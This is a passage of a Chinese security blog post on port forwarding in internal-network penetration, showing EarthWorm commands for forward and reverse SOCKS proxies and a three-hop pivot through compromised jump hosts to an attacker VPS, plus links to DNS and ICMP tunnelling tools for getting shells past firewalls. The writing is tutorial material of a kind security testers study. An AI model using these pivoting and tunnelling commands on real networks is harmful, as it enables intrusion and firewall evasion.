+<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
+<p>开启机器的1080端口做正向代理，我们可以通过链接该机器的1080端口进行端口代理转发。一般的场景为：kali 通过proxychain 链接开启了正向代理的公网ip。</p>
+<h4 id="反响代理"><a href="#反响代理" class="headerlink" title="反响代理"></a>反响代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#公网ip主机A，ip假设为1.1.1.1</span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888 </span><br><span class="line"></span><br><span class="line"># 目标机B</span><br><span class="line">./ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure>
+<p>反向代理是目标机向我们发起链接请求，与正向代理是不一样的。当建立了链接后，它的代理流如下<code>Me&lt;---&gt;A&lt;---&gt;B</code>。即我只要连接A的1080端口就可以获得一条反向代理的隧道，与B建立连接。这种场景可以用来绕过入口策略严格但是出口策略松散的防火墙。</p>
+<h4 id="多级转发"><a href="#多级转发" class="headerlink" title="多级转发"></a>多级转发</h4><p>在前面的两个场景中，我们看到了<code>rcsocks</code>,<code>`ssocksd</code>,<code>rssocks</code>这三个命令的使用。在多级转发中我们会见到另外三个命令的作用。他们就类似于中间件，负责隧道导流与串接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#命令使用举例：</span><br><span class="line"># lcx_listen 用在将本机的端口进行转发</span><br><span class="line">$ ./ew -s lcx_listen -l  1080   -e 8888</span><br><span class="line"># lcx_tran 将本机端口与目的ip地址的端口进行转发</span><br><span class="line">$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999</span><br><span class="line"># lcx_slave 作为奴隶，将本机直接可达的两个主机实体上的端口进行转发</span><br><span class="line">$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</span><br></pre></td></tr></table></figure>
+<p>下面我们来看个实际渗透三级级联例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 我们自己的VPS执行</span><br><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"># 跳板机A执行</span><br><span class="line">$ ./ew -s lcx_slave -d ip_A -e 8888 -f ip_B -g 9999</span><br><span class="line"></span><br><span class="line"># 跳板机B执行</span><br><span class="line">$ ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line"></span><br><span class="line"># 跳板机C执行</span><br><span class="line">$ ./ew -s rssocks -d ip_B -e 7777</span><br></pre></td></tr></table></figure></p>
+<p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks。<br>我们来解读以下这个三级级联，首先这是个反向代理的例子，反向代理的目的端口是C的7777，当隧道建立完成，我们只需要连接到VPS的1080端口，就会自动帮我们转发到7777。我们来看下中间过程如何：首先第一个命令VPS在8888接收反向代理，并且在1080等候我们的连接。第二条命令将跳板机A的8888端口导向9999；第三行命令将跳板机B的9999端口导向7777；最后第四条命令在跳板机上进行反向代理发起连接到跳板机B的7777端口。</p>
+<h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>frp也提供了完善的内网穿透的功能，功能上其实和gnork这些差不多，但是相比起来，FRP的配置更为灵活。推荐层度：<code>FRP&gt;Localtunnel&gt;gnork</code></p>
+<blockquote>
+<p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">中文官方文档</a></p>
+</blockquote>
+<h1 id="过墙隧道"><a href="#过墙隧道" class="headerlink" title="过墙隧道"></a>过墙隧道</h1><p>前面介绍的端口转发，有使用http协议，tcp协议，sockts代理的，但是这些协议转发流量太过于碍眼，容易被严谨的防火墙规则过滤，导致shell从内网出不来，那么在这种情况下，我们就需要强有力的过墙隧道。下面是笔者在网上搜罗的一些走udp的dns隧道和走icmp的隧道，可以说这两种打洞手段很别出心裁，笔者看得是叹为观止。这里先把相关的工具链接和看过的文章记录下来。写不动了……，避免篇幅过长（其实是有点懒），下次补上。</p>
+<h3 id="DNS2tcp"><a href="#DNS2tcp" class="headerlink" title="DNS2tcp"></a>DNS2tcp</h3><p><a href="https://pkgs.org/download/dns2tcp" target="_blank" rel="noopener">https://pkgs.org/download/dns2tcp</a></p>
+<p><a href="http://pwdme.cc/2016/11/11/dns2tcp-dns-tunnel/" target="_blank" rel="noopener">http://pwdme.cc/2016/11/11/dns2tcp-dns-tunnel/</a></p>
+<p><a href="https://www.freebuf.com/articles/system/8726.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/8726.html</a></p>
+<p><a href="https://kali.tuisec.win/kalitools/dns2tcp_zh.html" target="_blank" rel="noopener">https://kali.tuisec.win/kalitools/dns2tcp_zh.html</a></p>
+<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p><a href="https://github.com/yarrick/iodine" target="_blank" rel="noopener">https://github.com/yarrick/iodine</a>  </p>
+<p><a href="https://www.freebuf.com/articles/system/178214.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178214.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_36440115/article/details/76400359" target="_blank" rel="noopener">https://blog.csdn.net/weixin_36440115/article/details/76400359</a></p>
+<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/87976" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——基础篇</a><br><a href="https://www.anquanke.com/post/id/88851" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——进阶利用</a><br><a href="https://www.anquanke.com/post/id/89362" target="_blank" rel="noopener">Powershell攻击指南黑客后渗透之道系列——实战篇</a><br><a href="http://payloads.online/archivers/2018-02-02/1" target="_blank" rel="noopener">内网渗透常见端口转发方式</a><br><a href="https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/" target="_blank" rel="noopener">玩转SSH端口转发</a><br><a href="https://xz.aliyun.com/t/2354" target="_blank" rel="noopener">内网安全检查/渗透总结</a><br><a href="https://www.hi-linux.com/posts/25686.html" target="_blank" rel="noopener">推荐一款很好用的内网穿透工具—FRP</a><br><a href="https://www.hi-linux.com/posts/24471.html" target="_blank" rel="noopener">Localtunnel内网穿透工具的安装与使用</a><br><a href="https://www.hi-linux.com/posts/29097.html" target="_blank" rel="noopener">CentOS下部署Ngrok服务器</a>   </p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2018/12/22/内网渗透中的端口转发/">内网渗透中的端口转发</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1ypt0
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2018年12月22日 - 17:12
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2018年12月22日 - 17:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://lypto.me/2018/12/22/内网渗透中的端口转发/" title="内网渗透中的端口转发">http://lypto.me/2018/12/22/内网渗透中的端口转发/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/绕过/" rel="tag"># 绕过</a>
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/内网/" rel="tag"># 内网</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/20/FastCGI-RCE-in-SSRF/" rel="next" title="FastCGI RCE in SSRF">
+                <i class="fa fa-chevron-left"></i> FastCGI RCE in SSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
+          <p class="site-author-name" itemprop="name">1ypt0</p>
+           
+              <p class="site-description motion-element" itemprop="description">Please remember that. The Titanic was not supposed to sink, but it did.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://cesslab.club/#/" title="cesslab" target="_blank">cesslab</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://firmianay.github.io/" title="超哥" target="_blank">超哥</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nen9ma0.github.io/" title="大能猫" target="_blank">大能猫</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://dimo233.github.io/" title="去师" target="_blank">去师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.k0rz3n.com" title="天师" target="_blank">天师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://notwo1f.github.io/" title="武师" target="_blank">武师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://1phan.cc/" title="1phan" target="_blank">1phan</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sky3.pw/" title="sky" target="_blank">sky</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lookupes.com/" title="lookup" target="_blank">lookup</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://herbwen.com/" title="文师" target="_blank">文师</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#转发，映射，代理"><span class="nav-number">1.</span> <span class="nav-text">转发，映射，代理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统内置的转发工具"><span class="nav-number">2.</span> <span class="nav-text">系统内置的转发工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables-NAT功能"><span class="nav-number">2.1.</span> <span class="nav-text">iptables NAT功能</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#临时方案"><span class="nav-number">2.1.1.</span> <span class="nav-text">临时方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长期方案"><span class="nav-number">2.1.2.</span> <span class="nav-text">长期方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc"><span class="nav-number">2.2.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH"><span class="nav-number">2.3.</span> <span class="nav-text">SSH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netsh"><span class="nav-number">2.4.</span> <span class="nav-text">netsh</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#非内置的端口转发工具"><span class="nav-number">3.</span> <span class="nav-text">非内置的端口转发工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#socat"><span class="nav-number">3.1.</span> <span class="nav-text">socat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lcx-exe"><span class="nav-number">3.2.</span> <span class="nav-text">lcx.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter-portfwd"><span class="nav-number">3.3.</span> <span class="nav-text">meterpreter portfwd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rinetd"><span class="nav-number">3.4.</span> <span class="nav-text">Rinetd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunna-与-reGeorg"><span class="nav-number">3.5.</span> <span class="nav-text">Tunna 与 reGeorg</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Localtunnel与Gnork"><span class="nav-number">3.5.1.</span> <span class="nav-text">Localtunnel与Gnork</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EW"><span class="nav-number">3.5.2.</span> <span class="nav-text">EW</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#正向代理"><span class="nav-number">3.5.2.1.</span> <span class="nav-text">正向代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反响代理"><span class="nav-number">3.5.2.2.</span> <span class="nav-text">反响代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#多级转发"><span class="nav-number">3.5.2.3.</span> <span class="nav-text">多级转发</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FRP"><span class="nav-number">3.5.3.</span> <span class="nav-text">FRP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过墙隧道"><span class="nav-number">4.</span> <span class="nav-text">过墙隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS2tcp"><span class="nav-number">4.0.1.</span> <span class="nav-text">DNS2tcp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iodine"><span class="nav-number">4.0.2.</span> <span class="nav-text">iodine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#icmpsh"><span class="nav-number">4.0.3.</span> <span class="nav-text">icmpsh</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">5.</span> <span class="nav-text">参考文献</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1ypt0</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://lypto.me/2018/12/22/内网渗透中的端口转发/';
+          this.page.identifier = '2018/12/22/内网渗透中的端口转发/';
+          this.page.title = '内网渗透中的端口转发';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
